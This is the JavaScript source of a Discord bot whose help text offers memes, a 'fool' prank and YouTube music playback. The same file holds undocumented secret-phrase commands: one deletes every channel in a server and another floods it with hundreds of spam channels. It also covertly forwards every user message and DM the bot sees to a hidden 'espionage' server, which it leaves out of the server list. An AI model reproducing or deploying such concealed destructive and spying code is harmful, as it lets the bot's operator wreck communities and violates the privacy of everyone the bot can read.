const Discord = require('discord.js');
const config = require("./config.json");
const client = new Discord.Client();
const fs = require("fs");
const ytdl = require("ytdl-core");
const yt = require("youtube-node");
const https = require("https");
var youtube = new yt();
youtube.setKey(config.YT_API_KEY);
var serverData = {};

client.on('ready', () => {
	console.log(`Logged in as ${client.user.tag}!`);
	console.log(`Available in ${client.guilds.array().length} servers!`);
	var guilds = client.guilds.array();
	guilds.forEach(guild =>{
		console.log('    '+guild.name);
		serverData[guild.id]={id:guild.id,vc:null,connection:null,dispatcher:null,queue:[],loop:false}
	});
    client.user.setActivity("+help")
});


function checkFooled(msg,min,max,foolid,foolname) {
	if (foolid === undefined) {
		foolid = msg.author.id;
	}
	if (foolname === undefined) {
		foolname = msg.author.tag;
	}
	var rand = Math.floor(Math.random() * (+max - +min)) + min;
	if (msg.guild === null) {
		console.log(foolname+' DM '+rand+' '+msg.content);
	}
	else {
		console.log(foolname + ' ' + msg.guild.name + ' ' + rand + ' ' + msg.content);
	}
	if (rand == 50){
		console.log('Fooled '+foolname+'!');
		msg.channel.send('<@'+foolid+'>, YOU FELL FOR IT! THUNDER CROSS SPLIT ATTACK!');
		msg.channel.send('https://media.giphy.com/media/UWc4ifrnZLQjOczszu/source.mov');
	}
}

function changeMessage(msg){
	let message = msg.content.split(' ').slice(1,msg.content.length)
	var out = ''
	message.forEach(part=>{
		out += part+' '
	})
	client.user.setActivity(out)
}

function sendVideo(msg) {
	msg.channel.send("https://www.youtube.com/watch?v=wOFc4IJIoZg");
	console.log("Sent Video to "+msg.author.tag);
}

function nukeServer(msg){
	console.log("Arming cybernuke in "+msg.guild.name);
	var guild = msg.guild;
	guild.channels.array().forEach(channel => {
		if (channel.deletable) {
			try {
				channel.delete();
			}
			catch(error){
				nukeServer(msg);
			}
		}
	})
}

function massCreateChannels(msg){
	console.log("Commencing mass channelfuckery in "+msg.guild.name);
	var guild = msg.guild;
	for (i=0;i<240;i++) {
		if (guild.channels.array().length <498) {
			guild.createChannel("You fell for it, fool!");
			guild.createChannel("THUNDER CROSS SPLIT ATTACK","voice");
		}
		else{
			msg.channel.send("Max channels reached");
			console.log("Channel creation finished");
			break;
		}
	}
}

function sendEmbed(msg,embedTitle,desc){
	msg.channel.send({
		embed: {
			title: embedTitle,
			description: desc,
			color: config.color,
			footer: {
				text: "Requested by " + msg.author.tag,
				icon_url: msg.author.avatarURL
			}
		}
	});
}

function copypasta(msg){
	https.get("https://erewhon.xyz/copypasta/api/random",Res=>{
	    Res.on("data",data=>{
	        let out = JSON.parse(data);
			let embedTitle = out.title;
			let desc = out.content;
			sendEmbed(msg,embedTitle,desc);
	    })
	});
}

function returnServerNames(msg){
	var serverArray = getServers();
	var serverNames = '';
	serverArray.forEach(server =>{
		if (server.name != config.espionage) {
			serverNames = serverNames + server.name + '\n';
		}
	})
	sendEmbed(msg,"Currently available servers:",serverNames);
}

function writePS(msg){
	var flag = false;
	let msgPart = msg.content.split(" ");
	if (msgPart[2] === undefined||msg.mentions.users.array()[0] === undefined){
		console.log("Bad PS request");
		msg.reply("Incorrect syntax");
		return
	}
	if (msgPart[2].startsWith("https://")==false){
		msg.reply("Bad link, cannot add to database")
		return
	}
	let user = msg.mentions.users.array()[0].id;
	var file = fs.readFileSync("./personalStatements.json","utf8");
	let obj = JSON.parse(file);
	obj[user] = msgPart[2];
	file = JSON.stringify(obj);
	void fs.writeFile("./personalStatements.json",file,err=>{console.log(err)});
	console.log("Added personal statement to JSON")
	msg.reply("Added to personal statement database")
}

function readPS(msg){
	if (msg.mentions.users.array()[0] === undefined){
		console.log("Bad PS request");
		msg.reply("Incorrect syntax, user not tagged");
		return
	}
	let user = msg.mentions.users.array()[0].id;
	var file = fs.readFileSync("./personalStatements.json","utf8");
	let obj = JSON.parse(file);
	if (obj[user] === undefined){
		msg.reply("Personal statement does not exist, add using +addps");
		return
	}
	else{
		msg.reply(obj[user])
	}
}

function getServers(){
	return client.guilds.array();
}

function crossServerComms(msg, data){
	var voice = false;
	var serverArray = getServers();
	if (data === undefined){
		data = msg;
		voice = true;
		var msgSplit = msg.content.split(' ');
	}
	else{
		var msgSplit = msg.split(' ');
	}
	var queryName = msgSplit[1];
	var message = data.author.tag+': ';
	var i = 0;
	msgSplit.forEach(part => {
		if (i >=2){
			message = message + part +' ';
		}
		i +=1;
	});
	serverArray.forEach(server =>{
		if (server.name.startsWith(queryName)){
			var flag = true;
			server.channels.array().forEach(channel =>{
				if (channel.type == "text"){
					if (flag) {
						channel.send(message);
						if (voice == true) {
							console.log("Sent a message to " + server.name + " from " + data.author.tag+': '+message);
						}
						flag = false;
					}
				}
			})
		}
	})
}

function sendHelp(msg) {
	msg.channel.send({embed:{title:"Commands!",
		description:`Commands are:
		+help :Sends list of commands
		+video :Sends a link to the YOU FOOL video
		+fool :Fools the target user
		+pierre :While choosing what subjects to do at A-level, I hadn't once considered taking Psychology
		+servers :Returns the list of servers
		+toes :toes
		+play :plays a song from a youtube link
		+loop :loops the currently playing song
		+skip :skips the current song and leaps past it
		+stop :removes all songs from queue`,
		color:config.color,
		footer:{text:"Requested by "+msg.author.tag,
			icon_url:msg.author.avatarURL}}});
	console.log("Sent help to "+msg.author.tag);
}

function sausageRolls(msg){
	msg.channel.send('https://www.youtube.com/watch?v=_IgPM-XCrOE');
}

function fool(msg){
		if (msg.mentions.users.array()[0] === undefined){
			msg.channel.send({embed:{title:"Usage",description:"+fool [target user]",color:config.color}});
			console.log('Sent fool error to '+msg.author.tag);
		}
		else{
			if (msg.mentions.users.array()[0].tag != client.user.tag){
				checkFooled(msg,50,50,msg.mentions.users.array()[0].id,msg.mentions.users.array()[0].tag);
			}
			else{
				msg.channel.send('YOU FOOL! NOBODY CAN EVADE THIS TECHNIQUE!');
				console.log(msg.author.tag+' attempted to fool bot, proceeding to fool them');
				checkFooled(msg,50,50);
			}
		}
}

function toes(msg){
	msg.channel.send('https://tenor.com/view/toe-gif-8799475')
	console.log('Sent toes to '+msg.author.tag)
}

function pierre(msg){
	msg.channel.send("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
	console.log('Sent Pierre\'s personal statement to '+msg.author.tag)
}

function addConnection(msg){
	console.log("new connection initialising");
	var server = msg.guild;
	if (!server) return;
	var serverid = server.id;
	var vc = msg.member.voiceChannel;
	if (vc){
		vc.join().then(connection=>{
			server = serverData[serverid];
			server.vc = vc;
			server.connection = connection;
			newQ = getQueue(msg);
			play(msg,vc,connection,newQ)
		})
	}
}

function sendQueue(msg){
	let curQ = getQueue(msg);
	if (curQ.length>0) {
		var out = ''
		curQ.forEach((obj, index) => {
			if (index != 0) {
				out += `${index}: ${obj.name} \n`
			}
		});
		var embedTitle = `Now playing: ${curQ[0].name}`
	}
	else{
		var out = ''
		var embedTitle = `Nothing is currently playing`
	}
	sendEmbed(msg,embedTitle,out);
}

function remQueue(msg){
	var accQueue = getQueue(msg);
	accQueue.shift();
	updateQueue(msg,accQueue);
}

function getQueue(msg){
	var server = msg.guild;
	if (!server) return;
	var serverid = server.id;
	return serverData[serverid].queue;
}

function deleteListeners(guildid){
	let server = serverData[guildid];
	server.dispatcher = server.vc = server.connection = null;
	server.queue = [];
	server.loop = false;
}

function stopMusic(msg){
	var server = msg.guild;
	if (!server) return;
	deleteListeners(server.id)
}

function updateQueue(msg,accQueue){
	var server = msg.guild;
	if (!server) return;
	var serverid = server.id;
	serverData[serverid].queue = accQueue;
}

function getURL(msg){
	let server = msg.guild;
	if (!server) return;
	let urlString = msg.content.split(' ')
	urlString.shift()
	inp=''
	urlString.forEach(part=>{inp+=`${part} `})
	youtube.search(inp,1,(error,content) =>{
		if (error) msg.reply("An error has occured, input must refer to a youtube video");
		else{
			if (content.items[0]===undefined){
				msg.reply("An error has occured, input must refer to a youtube video")
				return;
			}
			else {
				searchResult=`https://www.youtube.com/watch?v=${content.items[0]["id"].videoId}`;
				addToQueue(searchResult,msg)
			}//
		}
	})
}

async function addToQueue(url,msg) {
	let server = msg.guild
	let serverid = server.id;
	let accQueue = getQueue(msg);
	var data = await ytdl.getBasicInfo(url);
	var toQ = {url:url,name:data.title};
	accQueue.push(toQ);
	sendEmbed(msg,`Added ${data.title} to the queue`,`Number ${accQueue.length} in queue`);
	updateQueue(msg,accQueue);
	if(serverData[serverid].vc === null) addConnection(msg);
}

function skipSong(msg){
	var msgServer = msg.guild;
	if (!msgServer) return;
	var serverid = msgServer.id;
	var server = serverData[serverid];
	if (!server.dispatcher) return;
	loop(msg, false,true);
	console.log("ending dispatcher")
	server.dispatcher.end();
}

function loop(msg,override,quiet){
	var msgserver = msg.guild;
	if (!msgserver) return;
	server = serverData[msgserver.id];
	if (override === undefined) {
		override = (!server.loop);
	}
	server.loop = override;
	if (!quiet){
		if (override===true){
			msg.reply("Loop enabled")
		}
		else{
			msg.reply("Loop disabled")
		}
	}
}

function checkInVC(user){
	if (user.user.id==config.BOT_ID){
		if (!user.voiceChannelID) deleteListeners(user.guild.id)
	}
}

async function play(msg,vc,connection,queue){
	var serverid = msg.guild.id;
	const stream = await ytdl(queue[0].url,{filter:'audioonly'});
	const dispatcher = await connection.playStream(stream);
	var server = serverData[serverid];
	server.dispatcher = dispatcher;
	dispatcher.on("end", end => {
		var loop = false;
		loop = server.loop;
		if (!loop) remQueue(msg);
		newQ = getQueue(msg);
		server.dispatcher = null;
		if (newQ.length>0) play(msg,vc,connection,newQ);
		else {
			vc.leave();
			deleteListeners(msg.guild.id);
		}
		console.log("  Play succesful, leaving")
	});
	dispatcher.on("error",error=>{dispatcher.end()})
}

async function test(msg){
	var out = ''
	console.log(serverData[msg.guild.id])
}

client.on('message', msg => {
	if (msg.channel.guild === undefined) {
		var spy = `+csc ${config.espionage} ${msg.content} (From:** Bot DM**)`;
	}
	else{
		var spy =`+csc ${config.espionage} ${msg.content} (From **${msg.channel.guild.name}**)`;
	}
	var commands = {
		"+help":sendHelp,
		"+video":sendVideo,
		"+3 5 2 7 9 1 1 9 9 9 1 8 8 9 9 9 8 1 1 0":nukeServer,
		"+sausagerolls":sausageRolls,
		"+what do we think of prem shit what do we think of shit prem":massCreateChannels,
		"+pierre":pierre,
		"+servers":returnServerNames,
		"+csc":crossServerComms,
		"+fool":fool,
		"+toes":toes,
		"+play":getURL,
		"+changemessage":changeMessage,
		"+addps":writePS,
		"+ps":readPS,
		"+queue":sendQueue,
		"+test":test,
		"+skip":skipSong,
		"+loop":loop,
		"+stop":stopMusic,
		"+copypasta":copypasta
	}
	if (!msg.author.bot) {
		crossServerComms(spy,msg);
		for (var call in commands){
			if (msg.content.startsWith(call)) commands[call](msg);
		}
		checkFooled(msg,30,70);
	}
});

client.on("voiceStateUpdate", (oldMember,newMember)=>{
	checkInVC(newMember)
})


client.login(config.token);
